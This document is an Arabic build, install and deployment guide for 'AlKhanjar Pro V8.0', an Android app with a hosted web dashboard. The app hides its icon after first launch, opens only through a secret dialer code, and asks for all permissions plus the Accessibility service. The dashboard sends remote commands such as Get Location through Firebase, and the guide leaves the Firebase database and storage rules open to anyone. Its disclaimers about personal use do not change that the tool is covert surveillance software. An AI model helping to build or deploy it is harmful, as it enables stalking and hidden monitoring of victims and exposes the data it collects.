# دليل البناء والتثبيت الكامل - AlKhanjar Pro V8.0

## المتطلبات الأساسية

### للبناء على الحاسوب (الطريقة الموصى بها):
- Android Studio Arctic Fox أو أحدث
- JDK 11 أو أحدث
- Android SDK Platform 34
- Gradle 8.0

### للبناء على Termux (Android):
```bash
pkg update && pkg upgrade
pkg install openjdk-17 gradle git
```

---

## خطوات البناء

### الطريقة 1: على الحاسوب (Windows/Mac/Linux)

#### 1. استيراد المشروع:
```bash
# فك الضغط
tar -xzf AlKhanjar-Pro-V8.0.tar.gz
cd AlKhanjar-Pro-V8.0/android-app

# افتح Android Studio
# File > Open > اختر مجلد android-app
```

#### 2. تثبيت المتطلبات:
- Android Studio سيقوم بتحميل كل المتطلبات تلقائياً
- انتظر حتى ينتهي Gradle Sync

#### 3. البناء:
```bash
# في Terminal داخل Android Studio
./gradlew clean
./gradlew assembleRelease

# أو استخدم السكريبت المرفق
chmod +x build.sh
./build.sh
```

#### 4. الملف الناتج:
```
app/build/outputs/apk/release/app-release.apk
```

---

### الطريقة 2: على Termux (هاتف Android)

#### 1. تثبيت المتطلبات:
```bash
pkg install openjdk-17 gradle git
```

#### 2. فك الضغط والدخول:
```bash
tar -xzf AlKhanjar-Pro-V8.0.tar.gz
cd AlKhanjar-Pro-V8.0/android-app
```

#### 3. تحديد ANDROID_HOME:
```bash
export ANDROID_HOME=$HOME/android-sdk
mkdir -p $ANDROID_HOME
```

#### 4. البناء:
```bash
chmod +x gradlew
./gradlew assembleRelease
```

**ملاحظة**: قد تواجه مشاكل في Termux. الطريقة الموصى بها هي استخدام الحاسوب.

---

## حل المشاكل الشائعة

### 1. مشكلة: "SDK location not found"
```bash
# أنشئ ملف local.properties
echo "sdk.dir=/path/to/android/sdk" > local.properties

# في Windows:
echo "sdk.dir=C:\\Users\\YourName\\AppData\\Local\\Android\\Sdk" > local.properties

# في Mac:
echo "sdk.dir=/Users/YourName/Library/Android/sdk" > local.properties

# في Linux:
echo "sdk.dir=/home/YourName/Android/Sdk" > local.properties
```

### 2. مشكلة: "Build failed - AAPT2 error"
```bash
# حذف الـ build cache وإعادة البناء
./gradlew clean
rm -rf .gradle build app/build
./gradlew assembleRelease
```

### 3. مشكلة: "Firebase missing"
```bash
# تأكد من وجود google-services.json في:
# android-app/app/google-services.json
```

### 4. مشكلة: "Java version incompatible"
```bash
# تأكد من استخدام Java 11 أو أحدث
java -version

# إذا كان الإصدار قديم، حمّل JDK 11:
# https://adoptium.net/
```

---

## التوقيع الرقمي (للإصدار النهائي)

### إنشاء مفتاح التوقيع:
```bash
keytool -genkey -v -keystore alkhanjar.keystore -alias alkhanjar -keyalg RSA -keysize 2048 -validity 10000
```

### التوقيع اليدوي:
```bash
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore alkhanjar.keystore app-release-unsigned.apk alkhanjar

zipalign -v 4 app-release-unsigned.apk alkhanjar-signed.apk
```

---

## تثبيت التطبيق

### 1. نقل APK للهاتف:
```bash
# باستخدام ADB
adb install app-release.apk

# أو انسخ الملف يدوياً للهاتف
```

### 2. التثبيت على الهاتف:
1. افتح الملف APK على الهاتف
2. اسمح بالتثبيت من مصادر غير معروفة
3. اضغط "تثبيت"

### 3. منح الأذونات:
1. افتح التطبيق أول مرة
2. اقبل جميع الأذونات المطلوبة
3. فعّل خدمة Accessibility
4. أضف للتطبيقات المستثناة من توفير البطارية

### 4. الإخفاء:
- بعد أول تشغيل، ستختفي الأيقونة تلقائياً
- للوصول مجدداً: اتصل بـ `*#*#2026#*#*`

---

## تشغيل لوحة التحكم

### الطريقة 1: محلياً (Local)
```bash
cd web-dashboard

# Python
python3 -m http.server 8000

# Node.js
npx http-server -p 8000

# PHP
php -S localhost:8000

# افتح المتصفح على:
http://localhost:8000
```

### الطريقة 2: على الإنترنت (Hosting)

#### استضافة على GitHub Pages:
```bash
# أنشئ repository جديد
git init
git add web-dashboard/*
git commit -m "Dashboard"
git branch -M gh-pages
git remote add origin <your-repo-url>
git push -u origin gh-pages

# سيكون متاح على:
# https://username.github.io/repo-name
```

#### استضافة على Netlify:
1. سجل في netlify.com
2. اسحب مجلد web-dashboard
3. سيُنشر تلقائياً

---

## إعداد Firebase

### 1. قواعد قاعدة البيانات:
```json
{
  "rules": {
    "devices": {
      ".read": true,
      ".write": true
    }
  }
}
```

### 2. قواعد التخزين:
```
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if true;
    }
  }
}
```

---

## الاختبار

### 1. اختبار التطبيق:
```bash
# تثبيت على جهاز تجريبي
adb install app-release.apk

# مراقبة السجلات
adb logcat | grep "SSV8"
```

### 2. اختبار لوحة التحكم:
1. افتح لوحة التحكم
2. انتظر ظهور الجهاز في القائمة
3. جرب إرسال أمر بسيط (مثل: Get Location)

---

## الأمان والخصوصية

⚠️ **تحذيرات مهمة:**

1. هذا المشروع للاستخدام الشخصي فقط
2. لا تستخدمه على أجهزة الآخرين بدون إذن صريح
3. أنت المسؤول القانوني الوحيد
4. غيّر الكود السري `2026` في:
   - `BuildConfig.SECRET_CODE`
   - `SecretCodeActivity.java`

---

## المراقبة وال Debugging

### مراقبة Firebase:
```
https://console.firebase.google.com/
> Realtime Database
> devices/
```

### Logcat على Android:
```bash
adb logcat | grep -E "SSV8|AlKhanjar"
```

### Chrome DevTools للوحة التحكم:
```
F12 > Console
```

---

## التحديثات المستقبلية

لإضافة ميزات جديدة:

1. أضف الأمر في `CommandExecutor.java`
2. أضف الوظيفة في لوحة التحكم `app.js`
3. أعد البناء والتثبيت

---

## الدعم

إذا واجهت مشاكل:

1. تحقق من Firebase Console
2. راجع Logcat للأخطاء
3. تأكد من جميع الأذونات ممنوحة
4. جرب حذف وإعادة تثبيت التطبيق

---

## الترخيص

هذا المشروع مخصص للأغراض التعليمية والاستخدام الشخصي فقط.
الاستخدام غير المصرح به لهذا البرنامج قد يكون غير قانوني.

---

**تم التطوير بواسطة: AlKhanjar Pro Team**
**الإصدار: 8.0**
**التاريخ: 2026**
